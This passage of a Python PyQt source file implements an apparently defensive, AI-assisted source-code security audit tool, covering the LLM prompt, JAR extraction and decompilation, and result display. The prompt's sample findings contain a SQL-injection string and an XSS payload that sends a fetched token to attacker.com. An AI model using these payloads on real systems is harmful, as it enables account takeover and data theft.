   [POC]
   POST /api/users HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {{"user_id": "1' OR 1=1; --"}}

   [中危|跨文件] XSS - {filename}:15 → CommonUtil.java:43 - userInput通过util方法未转义输出
   [POC]
   POST /profile/update HTTP/1.1
   Host: example.com
   Content-Type: application/x-www-form-urlencoded
   
   name=<script>fetch('/api/token').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?t='+d.token))</script>
"""

        # 特定语言的补充说明
        lang_specifics = "" # 默认为空
        if is_java:
            lang_specifics = """
5. Java特别关注：
   - 反序列化：ObjectInputStream/XMLDecoder使用
   - XXE：未禁用外部实体的XML解析
   - JNDI注入：动态LDAP/RMI查找
   - Spring漏洞：表达式注入、过时版本CVE
   - SQL注入：字符串拼接、未使用PreparedStatement
   - 访问控制：Spring Security配置、权限检查
   - 认证缺陷：Session固定、JWT不安全使用
"""
            if is_decompiled:
                lang_specifics += """   注意：这是反编译代码，变量名和控制流可能被混淆，请关注核心调用链和模式。\n"""
        # 添加PHP、Python、JS等其他语言的特定说明
        elif ".php" in filename.lower():
            lang_specifics = """
5. PHP特别关注：
   - 命令注入：system/exec/shell_exec/passthru函数
   - 文件包含：require/include变量传入
   - 反序列化：unserialize用户输入
   - 文件操作：文件上传缺少验证、目录遍历
   - SQL注入：未使用参数化查询
   - XSS：echo/print未过滤输出
   - SSRF：curl/file_get_contents用户控制URL
"""
        elif ".py" in filename.lower():
            lang_specifics = """
5. Python特别关注：
   - 命令注入：os.system/subprocess/eval使用
   - SQL注入：字符串格式化/拼接
   - 模板注入：render_template_string不安全使用
   - 不安全反序列化：pickle/marshal/yaml.load
   - 路径遍历：os.path操作
   - SSRF：requests/urllib不受限的URL
   - Flask/Django安全配置：SECRET_KEY、CSRF保护
"""
        elif ".js" in filename.lower() or ".ts" in filename.lower():
            lang_specifics = """
5. JavaScript/TypeScript特别关注：
   - DOM XSS：innerHTML/document.write使用
   - 原型污染：递归合并/深拷贝操作
   - 不安全eval：eval/Function/setTimeout字符串参数
   - 注入：不安全动态渲染
   - 不安全配置：不安全的第三方包
   - Node.js风险：命令注入、目录遍历、路由控制
"""

        # 组合部分 - 现在所有的花括号已经被正确处理，不再需要格式化
        prompt = f"""{common_instructions}
{lang_specifics}
6. 【项目全局结构】
{context_summary}

7. 【当前文件代码审计: {filename}】({'反编译' if is_decompiled else '源码'})
```
{escaped_content}
```"""

        # 不再需要使用.format()方法，直接返回包含所有替换内容的字符串
        return prompt
    
    def chat_completion(self, messages):
        """调用AI API获取回复"""
        try:
            return self.api_adapter.chat_completion(messages=messages)
        except Exception as e:
            logging.error(f"API调用失败: {str(e)}", exc_info=True)
            return f"[分析过程出错: {str(e)}]"


# --- UI Creation and Logic ---

def create_tab(main_window):
    """Creates the Source Code Audit tab."""
    tab = QWidget()
    layout = QVBoxLayout(tab)
    layout.addWidget(QLabel("源码安全审计系统 (上下文感知)", font=QFont("Arial", 16, QFont.Bold))) # Updated title

    # --- Directory/JAR Selection ---
    select_widget = QWidget()
    select_layout = QHBoxLayout(select_widget)
    main_window.audit_btn_choose_dir = QPushButton("选择源码目录")
    main_window.audit_btn_choose_jar = QPushButton("选择JAR/WAR包")
    main_window.audit_label_path = QLabel("未选择目录/JAR包")
    main_window.audit_label_path.setWordWrap(True)
    select_layout.addWidget(main_window.audit_btn_choose_dir)
    select_layout.addWidget(main_window.audit_btn_choose_jar)
    select_layout.addWidget(main_window.audit_label_path, 1) # Stretch label
    select_layout.setContentsMargins(0,0,0,0)
    layout.addWidget(select_widget)

    # --- File Type Filters ---
    filter_widget = QWidget(objectName="filter_control") # Keep object name for decompile widget insertion
    filter_layout = QHBoxLayout(filter_widget)
    main_window.audit_check_php = QCheckBox("PHP")
    main_window.audit_check_jsp = QCheckBox("JSP")
    main_window.audit_check_asp = QCheckBox("ASP")
    main_window.audit_check_java = QCheckBox("Java")
    # Defaults
    main_window.audit_check_php.setChecked(True)
    main_window.audit_check_jsp.setChecked(True)
    main_window.audit_check_asp.setChecked(True)
    main_window.audit_check_java.setChecked(True)
    filter_layout.addWidget(QLabel("审计文件类型:"))
    filter_layout.addWidget(main_window.audit_check_php)
    filter_layout.addWidget(main_window.audit_check_jsp)
    filter_layout.addWidget(main_window.audit_check_asp)
    filter_layout.addWidget(main_window.audit_check_java)
    filter_layout.addStretch()
    filter_layout.setContentsMargins(0,0,0,0)
    layout.addWidget(filter_widget)

    # --- Status Label (for JAR processing) ---
    main_window.audit_jar_status_label = QLabel("")
    layout.addWidget(main_window.audit_jar_status_label)

    # --- Decompile Progress (Placeholder, widget added dynamically) ---
    main_window.decompile_ui_container = QWidget()
    main_window.decompile_ui_layout = QVBoxLayout(main_window.decompile_ui_container)
    main_window.decompile_ui_layout.setContentsMargins(0, 0, 0, 0)
    layout.addWidget(main_window.decompile_ui_container)
    main_window.decompile_ui_container.setVisible(False) # Hide initially


    # --- Audit Progress Bar ---
    main_window.audit_progress = QProgressBar()
    main_window.audit_progress.setValue(0)
    main_window.audit_progress.setTextVisible(True)
    main_window.audit_progress.setFormat("等待操作") # Initial text
    layout.addWidget(main_window.audit_progress)

    # --- Action Buttons ---
    action_widget = QWidget()
    action_layout = QHBoxLayout(action_widget)
    main_window.audit_btn_start = QPushButton("开始深度审计")
    main_window.audit_btn_stop = QPushButton("停止审计")
    main_window.audit_btn_clean_temp = QPushButton("清理临时文件")
    main_window.audit_btn_stop.setEnabled(False)
    main_window.audit_btn_clean_temp.setEnabled(False) # Enable after JAR processing
    action_layout.addWidget(main_window.audit_btn_start)
    action_layout.addWidget(main_window.audit_btn_stop)
    action_layout.addWidget(main_window.audit_btn_clean_temp)
    action_layout.addStretch()
    action_layout.setContentsMargins(0,0,0,0)
    layout.addWidget(action_widget)

    # --- Result Area ---
    layout.addWidget(QLabel("审计结果:"))
    # Ensure create_scroll_textedit is correctly imported and used
    result_frame, main_window.audit_result = create_scroll_textedit(read_only=True, font_family='Consolas', font_size=11)
    layout.addWidget(result_frame, 1)

    # --- Connect Signals ---
    main_window.audit_btn_choose_dir.clicked.connect(lambda: choose_directory(main_window))
    main_window.audit_btn_choose_jar.clicked.connect(lambda: choose_jar_file(main_window))
    main_window.audit_btn_start.clicked.connect(lambda: start_source_audit(main_window))
    main_window.audit_btn_stop.clicked.connect(lambda: stop_source_audit(main_window))
    main_window.audit_btn_clean_temp.clicked.connect(lambda: cleanup_temp_files(main_window))

    # --- Internal State ---
    main_window.audit_files = []
    main_window.audit_target_path = None
    main_window.audit_temp_dir = None
    main_window.is_jar_audit = False
    main_window.is_decompiled_audit = False

    main_window.tab_widget.addTab(tab, "源码审计")


def choose_directory(main_window):
    """Slot to choose a source code directory."""
    # Clear previous JAR state
    reset_jar_state(main_window)

    options = QFileDialog.Options()
    options |= QFileDialog.ShowDirsOnly
    directory = QFileDialog.getExistingDirectory(main_window, "选择源码目录", "", options=options)
    if directory:
        main_window.audit_target_path = directory
        main_window.is_jar_audit = False
        main_window.audit_label_path.setText(f"已选目录: {directory}")
        scan_source_files(main_window) # Update file list based on filters

def choose_jar_file(main_window):
    """Slot to choose a JAR/WAR file."""
    # Clear previous state
    reset_jar_state(main_window)

    options = QFileDialog.Options()
    jar_file, _ = QFileDialog.getOpenFileName(main_window, "选择JAR/WAR包", "", "Archives (*.jar *.war);;All Files (*)", options=options)
    if jar_file:
        main_window.audit_target_path = jar_file
        main_window.is_jar_audit = True
        main_window.audit_label_path.setText(f"已选包: {os.path.basename(jar_file)}")
        main_window.audit_jar_status_label.setText("准备处理JAR/WAR包...")
        main_window.audit_jar_status_label.setStyleSheet("color: #007acc;") # Blue
        main_window.audit_progress.setValue(0)
        main_window.audit_progress.setFormat("准备处理...")

        # Set Java filter ON, as we primarily decompile Java from JARs
        main_window.audit_check_java.setChecked(True)

        # Start extraction/decompilation process
        process_archive(main_window, jar_file)

def reset_jar_state(main_window):
     """Resets variables related to JAR processing."""
     cleanup_temp_files(main_window) # Clean up any previous temp files
     main_window.audit_target_path = None
     # main_window.audit_temp_dir should be cleaned by cleanup_temp_files
     main_window.is_jar_audit = False
     main_window.is_decompiled_audit = False
     main_window.audit_files = []
     main_window.audit_jar_status_label.setText("")
     main_window.audit_btn_clean_temp.setEnabled(False)
     # Remove decompile progress widget if it exists
     clear_decompile_progress_ui(main_window) # Use helper function
     main_window.audit_progress.setValue(0)
     main_window.audit_label_path.setText("未选择目录/JAR包")
     main_window.audit_progress.setFormat("等待操作")

def scan_source_files(main_window):
    """Scans the selected directory or temp directory for source files based on filters."""
    if not main_window.audit_target_path and not main_window.audit_temp_dir:
         logging.warning("Scan source files called with no target path or temp dir.")
         return

    # Use temp dir if it exists (implies JAR audit), otherwise the selected directory
    scan_root = main_window.audit_temp_dir if main_window.audit_temp_dir else main_window.audit_target_path

    if not scan_root or not os.path.isdir(scan_root):
        logging.warning(f"Scan root directory is invalid or does not exist: {scan_root}")
        main_window.audit_files = []
        main_window.audit_progress.setFormat("目录无效")
        return

    exts = []
    # Create mapping for clarity
    ext_map = {
        main_window.audit_check_php: '*.php',
        main_window.audit_check_jsp: '*.jsp',
        main_window.audit_check_asp: '*.asp',
        main_window.audit_check_java: '*.java'
    }
    for checkbox, ext_pattern in ext_map.items():
        if checkbox.isChecked():
            exts.append(ext_pattern)

    if not exts:
        main_window.audit_files = []
        main_window.show_status("请至少选择一种文件类型进行审计", "orange")
        main_window.audit_progress.setValue(0)
        main_window.audit_progress.setFormat("请选择文件类型")
        return

    logging.info(f"Scanning {scan_root} for {exts}")
    main_window.audit_files = []
    for ext_pattern in exts:
        try:
            pattern = f'**/{ext_pattern}'
            # Ensure scan_root is a Path object for rglob
            found_files = list(Path(scan_root).rglob(pattern))
            # Filter out files in potential temp/build dirs within source? Optional.
            # Example: filter(lambda f: '/.git/' not in str(f) and '/target/' not in str(f), found_files)
            main_window.audit_files.extend([str(f) for f in found_files])
            logging.debug(f"Found {len(found_files)} files for pattern {pattern}")
        except Exception as e:
            logging.error(f"Error globbing for {ext_pattern} in {scan_root}: {e}", exc_info=True)
            main_window.show_status(f"扫描文件时出错: {e}", "red")


    file_count = len(main_window.audit_files)
    logging.info(f"Found {file_count} source files matching filters.")

    # Update path label based on whether it's dir or JAR
    if main_window.is_jar_audit:
         if main_window.audit_target_path: # Check if path exists (might be cleared on error)
            path_text = f"已选包: {os.path.basename(main_window.audit_target_path)} | 文件数: {file_count}"
         else:
            path_text = f"包处理中 | 文件数: {file_count}"
         main_window.audit_label_path.setText(path_text)

    else: # Directory audit
         if main_window.audit_target_path:
              main_window.audit_label_path.setText(f"已选目录: {main_window.audit_target_path} | 文件数: {file_count}")
         else: # Should not happen if choose_directory worked
              main_window.audit_label_path.setText(f"目录扫描 | 文件数: {file_count}")


    # Update JAR status label only if it's a JAR audit
    if main_window.is_jar_audit:
        status_msg = f"准备审计 {file_count} 个文件 (含反编译)" if main_window.is_decompiled_audit else f"准备审计 {file_count} 个文件"
        # Check if audit_jar_status_label exists before setting text
        if hasattr(main_window, 'audit_jar_status_label'):
             main_window.audit_jar_status_label.setText(status_msg)
             main_window.audit_jar_status_label.setStyleSheet("color: #2ed573;") # Green

    # Check if audit_progress exists before setting values
    if hasattr(main_window, 'audit_progress'):
        main_window.audit_progress.setMaximum(file_count if file_count > 0 else 100) # Avoid max 0
        main_window.audit_progress.setValue(0)
        main_window.audit_progress.setFormat(f"找到 {file_count} 个文件")


def process_archive(main_window, archive_file):
    """Extracts archive and initiates decompilation if necessary."""
    try:
        # Create unique temp directory based on archive name
        archive_name = os.path.splitext(os.path.basename(archive_file))[0]
        # Use system temp dir for better isolation and cleanup potential
        main_window.audit_temp_dir = tempfile.mkdtemp(prefix=f"secai_{archive_name}_")
        logging.info(f"Created temp directory for archive: {main_window.audit_temp_dir}")
        main_window.audit_btn_clean_temp.setEnabled(True) # Enable cleanup button

        extract_dir = os.path.join(main_window.audit_temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)

        main_window.audit_jar_status_label.setText("正在解压...")
        main_window.audit_jar_status_label.setStyleSheet("color: #007acc;")
        main_window.audit_progress.setRange(0, 100) # Use 0-100 for simplicity
        main_window.audit_progress.setValue(0)
        main_window.audit_progress.setFormat("解压中 %p%")

        # --- Extract Archive ---
        logging.info(f"Extracting {archive_file} to {extract_dir}")
        with zipfile.ZipFile(archive_file, 'r') as zip_ref:
            file_list = zip_ref.namelist()
            total_files = len(file_list)
            logging.info(f"Archive contains {total_files} files.")
            for i, file_info in enumerate(file_list):
                 # Update progress bar based on extraction progress
                 progress = int(((i + 1) / total_files) * 30) # Extraction takes ~30% of initial phase
                 main_window.audit_progress.setValue(progress)
                 # Add small delay or processEvents if extraction is blocking UI?
                 # QApplication.processEvents() # Use with caution
                 try:
                      zip_ref.extract(file_info, extract_dir)
                 except Exception as extract_err:
                      logging.warning(f"Could not extract {file_info} from archive: {extract_err}")
                      # Optionally skip or report error?
        logging.info(f"Archive extracted successfully.")
        main_window.audit_progress.setValue(30) # Mark extraction as complete


        # --- Find .class files ---
        main_window.audit_jar_status_label.setText("正在查找 .class 文件...")
        main_window.audit_progress.setFormat("查找 .class 文件...")
        class_files = list(Path(extract_dir).rglob('*.class'))
        logging.info(f"Found {len(class_files)} .class files.")
        main_window.audit_progress.setValue(40) # Mark finding as complete (arbitrary 40%)

        if not class_files:
            main_window.audit_jar_status_label.setText("未找到 .class 文件，将仅审计源码")
            main_window.audit_jar_status_label.setStyleSheet("color: orange;")
            # Proceed to scan for existing source files (like .java, .jsp etc.)
            scan_source_files(main_window)
            return

        # --- Initiate Decompilation ---
        decompiled_dir = os.path.join(main_window.audit_temp_dir, "decompiled")
        os.makedirs(decompiled_dir, exist_ok=True)

        main_window.audit_jar_status_label.setText(f"找到 {len(class_files)} 个 .class 文件，准备反编译...")
        main_window.audit_progress.setFormat("准备反编译...") # Keep main progress bar here

        # Add decompile progress UI elements dynamically below main progress
        add_decompile_progress_ui(main_window)

        # Start decompile thread
        logging.info("Starting DecompileThread...")
        # Ensure we don't have a lingering thread reference
        if hasattr(main_window, 'decompile_thread') and main_window.decompile_thread.isRunning():
            logging.warning("Existing decompile thread found running, attempting to stop first...")
            main_window.decompile_thread.stop()
            main_window.decompile_thread.wait(2000) # Wait up to 2s

        main_window.decompile_thread = DecompileThread(
            [str(f) for f in class_files], # Pass paths as strings
            decompiled_dir,
            main_window.audit_temp_dir, # Pass base temp dir
            main_window # Parent
        )
        main_window.decompile_thread.progress_updated.connect(
             lambda p, m: update_decompile_progress(main_window, p, m)
        )
        main_window.decompile_thread.decompile_complete.connect(
             lambda count, msg: on_decompile_complete(main_window, count, msg)
        )
        main_window.decompile_thread.start()
        logging.info("DecompileThread started.")


    except zipfile.BadZipFile:
         logging.error(f"Invalid or corrupted archive file: {archive_file}")
         main_window.audit_jar_status_label.setText("错误：文件不是有效的JAR/WAR包")
         main_window.audit_jar_status_label.setStyleSheet("color: red;")
         reset_jar_state(main_window)
    except PermissionError as e:
         logging.error(f"Permission error during archive processing: {e}", exc_info=True)
         main_window.audit_jar_status_label.setText(f"权限错误: {e}")
         main_window.audit_jar_status_label.setStyleSheet("color: red;")
         reset_jar_state(main_window) # Attempt cleanup
    except Exception as e:
        logging.error(f"Failed to process archive {archive_file}: {e}", exc_info=True)
        main_window.audit_jar_status_label.setText(f"处理包时出错: {e}")
        main_window.audit_jar_status_label.setStyleSheet("color: red;")
        # Attempt cleanup even on error
        reset_jar_state(main_window)


def add_decompile_progress_ui(main_window):
    """Adds progress bar and cancel button for decompilation into the container."""
    # Clear previous contents of the container first
    clear_decompile_progress_ui(main_window)
    logging.debug("Adding decompile progress UI elements.")

    # Ensure the container exists
    if not hasattr(main_window, 'decompile_ui_container'):
         logging.error("Decompile UI container does not exist on main window.")
         return

    decompile_widget = QWidget() # Create the actual widget to hold the elements
    decompile_layout = QHBoxLayout(decompile_widget)
    decompile_layout.setContentsMargins(0, 5, 0, 5) # Add some vertical margin

    main_window.decompile_progress = QProgressBar()
    main_window.decompile_progress.setRange(0, 100)
    main_window.decompile_progress.setValue(0)
    main_window.decompile_progress.setTextVisible(True)
    main_window.decompile_progress.setFormat("反编译 %p%")

    main_window.cancel_decompile_btn = QPushButton("取消反编译")
    main_window.cancel_decompile_btn.setStyleSheet("background-color: #ff6b6b;") # Reddish color
    main_window.cancel_decompile_btn.clicked.connect(lambda: cancel_decompile(main_window))

    decompile_layout.addWidget(QLabel("反编译进度:"))
    decompile_layout.addWidget(main_window.decompile_progress, 1) # Stretch progress bar
    decompile_layout.addWidget(main_window.cancel_decompile_btn)

    # Add the created widget to the container's layout
    main_window.decompile_ui_layout.addWidget(decompile_widget)
    main_window.decompile_widget = decompile_widget # Store reference to remove later if needed

    main_window.decompile_ui_container.setVisible(True) # Show the container

def clear_decompile_progress_ui(main_window):
     """Removes the decompile progress UI elements."""
     if hasattr(main_window, 'decompile_ui_container'):
         # Check if the layout exists before trying to manipulate it
         layout = getattr(main_window, 'decompile_ui_layout', None)
         if layout is not None:
             # Remove widgets safely
             while layout.count():
                 item = layout.takeAt(0)
                 if item:
                     widget = item.widget()
                     if widget is not None:
                         widget.setParent(None)
                         widget.deleteLater()
         # Hide the container after clearing
         main_window.decompile_ui_container.setVisible(False)
         logging.debug("Decompile progress UI cleared.")
     # Delete references to the widgets if they exist to prevent memory leaks and attribute errors
     for attr_name in ['decompile_widget', 'decompile_progress', 'cancel_decompile_btn']:
         if hasattr(main_window, attr_name):
             try:
                 delattr(main_window, attr_name)
             except AttributeError: # Should not happen, but just in case
                 pass


def update_decompile_progress(main_window, percent, message):
    """Updates the decompilation progress bar and status label."""
    # Ensure UI elements still exist before updating
    if hasattr(main_window, 'decompile_progress') and main_window.decompile_progress:
        main_window.decompile_progress.setValue(percent)
        main_window.decompile_progress.setFormat(f"反编译 {percent}% - {message[:30]}...") # Show truncated message
    # Also update the main JAR status label below the filters
    if hasattr(main_window, 'audit_jar_status_label'):
        main_window.audit_jar_status_label.setText(message)


def cancel_decompile(main_window):
    """Stops the running decompilation thread."""
    if hasattr(main_window, 'decompile_thread') and main_window.decompile_thread.isRunning():
        logging.info("User requested decompilation cancel.")
        main_window.decompile_thread.stop() # Signal the thread to stop
        if hasattr(main_window, 'cancel_decompile_btn'):
            main_window.cancel_decompile_btn.setEnabled(False)
            main_window.cancel_decompile_btn.setText("取消中...")
        if hasattr(main_window, 'audit_jar_status_label'):
            main_window.audit_jar_status_label.setText("正在取消反编译...")
            main_window.audit_jar_status_label.setStyleSheet("color: orange;")
    else:
        logging.warning("Cancel decompile requested, but thread is not running.")


def on_decompile_complete(main_window, count, message):
    """Callback when decompilation thread finishes."""
    logging.info(f"Decompilation complete signal received. Count: {count}, Message: {message}")
    # Update UI elements if they still exist
    if hasattr(main_window, 'cancel_decompile_btn'):
        main_window.cancel_decompile_btn.setEnabled(False)
        if "中止" in message:
            main_window.cancel_decompile_btn.setText("反编译已中止")
            status_style = "color: orange;"
            final_progress_format = "反编译已中止"
        elif count > 0:
            main_window.cancel_decompile_btn.setText("反编译完成")
            status_style = "color: #2ed573;" # Green
            final_progress_format = f"反编译完成 ({count})"
        else: # Failed or no files generated
            main_window.cancel_decompile_btn.setText("反编译失败")
            status_style = "color: red;"
            final_progress_format = "反编译失败"

        if hasattr(main_window, 'audit_jar_status_label'):
             main_window.audit_jar_status_label.setText(f"{message} ({count} 文件)")
             main_window.audit_jar_status_label.setStyleSheet(status_style)

        if hasattr(main_window, 'decompile_progress'):
             # Ensure progress shows 100% if completed successfully or failed (not cancelled)
             if "中止" not in message:
                 main_window.decompile_progress.setValue(100)
             main_window.decompile_progress.setFormat(final_progress_format)


    # Update decompiled flag if successful (and not cancelled)
    main_window.is_decompiled_audit = (count > 0 and "中止" not in message)

    # Rescan files including the newly decompiled ones
    scan_source_files(main_window)


def start_source_audit(main_window):
    """Slot to start the source code audit (now with two passes)."""
    # Rescan files based on current filters before starting
    scan_source_files(main_window)

    if not main_window.audit_files:
        main_window.show_status("没有找到符合条件的文件进行审计", "red")
        return

    main_window.audit_btn_start.setEnabled(False)
    main_window.audit_btn_stop.setEnabled(True)
    main_window.audit_result.clear()
    main_window.audit_progress.setValue(0)
    # Initial status indicates Pass 1
    initial_status = SourceCodeAuditThread.PHASE_GATHERING_CONTEXT
    main_window.audit_progress.setFormat(f"{initial_status} 0%")
    main_window.show_status("开始源码审计 (阶段 1/2)...", "#007acc")

    if main_window.is_jar_audit:
         status_msg = "正在分析包结构..."
         if hasattr(main_window, 'audit_jar_status_label'):
            main_window.audit_jar_status_label.setText(status_msg)
            main_window.audit_jar_status_label.setStyleSheet("color: #007acc;") # Blue

    # Create and start the *modified* audit thread
    # Ensure no lingering thread reference
    if hasattr(main_window, 'audit_thread') and main_window.audit_thread.isRunning():
        logging.warning("Existing audit thread found running, attempting to stop first...")
        main_window.audit_thread.stop()
        main_window.audit_thread.wait(2000)

    main_window.audit_thread = SourceCodeAuditThread(
        main_window.audit_files,
        parent=main_window,
        is_decompiled_audit=main_window.is_decompiled_audit
    )
    # Connect progress update to handle the status message
    main_window.audit_thread.progress_updated.connect(
         lambda p, msg: update_audit_progress(main_window, p, msg) # Pass message too
    )
    main_window.audit_thread.audit_complete.connect(
        lambda result: show_audit_result(main_window, result)
    )
    main_window.audit_thread.start()
    logging.info("SourceCodeAuditThread (Contextual) started.")

def update_audit_progress(main_window, percent, message):
    """Updates the main audit progress bar and its text, reflecting the phase."""
    # Check if the progress bar widget still exists
    if hasattr(main_window, 'audit_progress') and main_window.audit_progress:
        main_window.audit_progress.setValue(percent)
        # Use the message from the thread signal for more context
        main_window.audit_progress.setFormat(f"{message} {percent}%")

def stop_source_audit(main_window):
    """Stops the running source audit thread."""
    if hasattr(main_window, 'audit_thread') and main_window.audit_thread.isRunning():
         logging.info("User requested source audit stop.")
         main_window.audit_thread.stop() # Signal thread to stop
         main_window.audit_btn_stop.setEnabled(False)
         main_window.audit_btn_stop.setText("停止中...")
         main_window.show_status("正在停止审计...", "orange")
    else:
        logging.warning("Stop audit called but no audit thread is running.")


def show_audit_result(main_window, result):
    """Displays the final audit result."""
    logging.info("Audit complete signal received.")
    main_window.audit_btn_start.setEnabled(True)
    main_window.audit_btn_stop.setEnabled(False)
    main_window.audit_btn_stop.setText("停止审计") # Reset button

    main_window.audit_result.setPlainText(result)

    # Update progress bar and status based on whether it was stopped
    is_stopped = "中止" in result[-50:] # Basic check if stop message is present
    final_percent = 0
    if hasattr(main_window, 'audit_progress') and main_window.audit_progress:
        final_percent = main_window.audit_progress.value()

    status_color = "#2ed573" # Green default
    status_message = "源码审计完成"
    progress_format = "审计完成"


    if is_stopped:
        status_message = "审计被用户中止"
        status_color = "orange"
        progress_format = f"审计已中止 ({final_percent}%)"
    else:
        # Ensure progress bar reaches 100% if not stopped
        if hasattr(main_window, 'audit_progress') and main_window.audit_progress and final_percent < 100:
             main_window.audit_progress.setValue(100)

    main_window.show_status(status_message, status_color)
    if hasattr(main_window, 'audit_progress') and main_window.audit_progress:
        main_window.audit_progress.setFormat(progress_format)

    # Update JAR status label specific message
    if main_window.is_jar_audit and hasattr(main_window, 'audit_jar_status_label'):
        jar_status_msg = "审计完成 (含反编译)" if main_window.is_decompiled_audit else "审计完成"
        if is_stopped:
            jar_status_msg = "审计中止"
        main_window.audit_jar_status_label.setText(jar_status_msg)
        main_window.audit_jar_status_label.setStyleSheet("color: #2ed573;" if not is_stopped else "color: orange;")


def cleanup_temp_files(main_window):
    """Cleans up the temporary directory created for JAR extraction."""
    if hasattr(main_window, 'audit_temp_dir') and main_window.audit_temp_dir:
        temp_dir_to_clean = main_window.audit_temp_dir
        if os.path.exists(temp_dir_to_clean):
            logging.info(f"Cleaning up temporary directory: {temp_dir_to_clean}")
            try:
                # Attempt to remove the directory tree robustly
                shutil.rmtree(temp_dir_to_clean, ignore_errors=True) # Ignore errors during removal if possible

                # Verify removal after attempting
                if not os.path.exists(temp_dir_to_clean):
                    if hasattr(main_window, 'audit_jar_status_label'):
                        main_window.audit_jar_status_label.setText("临时文件已清理")
                        main_window.audit_jar_status_label.setStyleSheet("color: #2ed573;") # Green
                    main_window.audit_temp_dir = None # Clear the path variable
                    if hasattr(main_window, 'audit_btn_clean_temp'):
                        main_window.audit_btn_clean_temp.setEnabled(False)
                    logging.info("Temporary directory cleaned successfully.")
                else:
                    # Directory still exists after rmtree(ignore_errors=True)
                    logging.error(f"Failed to completely remove temporary directory {temp_dir_to_clean}. Some files might be locked.")
                    if hasattr(main_window, 'audit_jar_status_label'):
                        main_window.audit_jar_status_label.setText(f"临时文件清理失败 (部分文件可能被占用)")
                        main_window.audit_jar_status_label.setStyleSheet("color: red;")

            except Exception as e:
                logging.error(f"Exception during temporary directory cleanup {temp_dir_to_clean}: {e}", exc_info=True)
                if hasattr(main_window, 'audit_jar_status_label'):
                    main_window.audit_jar_status_label.setText(f"临时文件清理时出错: {e}")
                    main_window.audit_jar_status_label.setStyleSheet("color: red;")
        else:
             # Dir path exists in variable but dir itself doesn't - already cleaned or failed creation
             main_window.audit_temp_dir = None
             if hasattr(main_window, 'audit_btn_clean_temp'):
                 main_window.audit_btn_clean_temp.setEnabled(False)
             # Optionally clear status label if needed, or leave previous message
             logging.info("Temporary directory path found but directory does not exist (already cleaned or failed creation?).")
    else:
         logging.info("No temporary directory path found to clean.")
         if hasattr(main_window, 'audit_btn_clean_temp'):
            main_window.audit_btn_clean_temp.setEnabled(False)
         # Clear status label if it's irrelevant now
         if hasattr(main_window, 'audit_jar_status_label') and main_window.is_jar_audit: # Only clear if it was a JAR audit status
            main_window.audit_jar_status_label.setText("")
